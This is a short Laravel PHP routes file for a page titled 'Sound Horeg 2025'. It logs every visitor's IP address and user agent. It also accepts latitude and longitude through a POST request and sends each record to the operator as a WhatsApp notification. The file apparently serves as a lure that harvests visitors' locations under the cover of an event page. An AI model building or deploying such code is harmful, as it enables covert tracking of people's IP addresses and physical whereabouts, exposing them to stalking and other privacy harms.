<?php

use App\Jobs\SendWhatsappNotif;
use App\Models\Information;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {

    $info = Information::create([
        'user_agent' => request()->userAgent(),
        'ip_address' => $_SERVER["HTTP_CF_CONNECTING_IP"] ?? request()->ip()
    ]);

    // SendWhatsappNotif::dispatchSync($info);

    return view('welcome', [
        'title' => 'Sound Horeg 2025'
    ]);

});

Route::post('/', function (Request $request) {

    $request->validate([
        'latitude' => ['required'],
        'longitude' => ['required']
    ]);

    $info = Information::create([
        'user_agent' => request()->userAgent(),
        'ip_address' => $_SERVER["HTTP_CF_CONNECTING_IP"] ?? request()->ip(),
        'latitude' => $request->get('latitude'),
        'longitude' => $request->get('longitude'),
    ]);

    SendWhatsappNotif::dispatchSync($info);

    return response()->json([
        'status' => 'OK'
    ]);

});

Route::get('/coba', function() {
    SendWhatsappNotif::dispatchSync();
});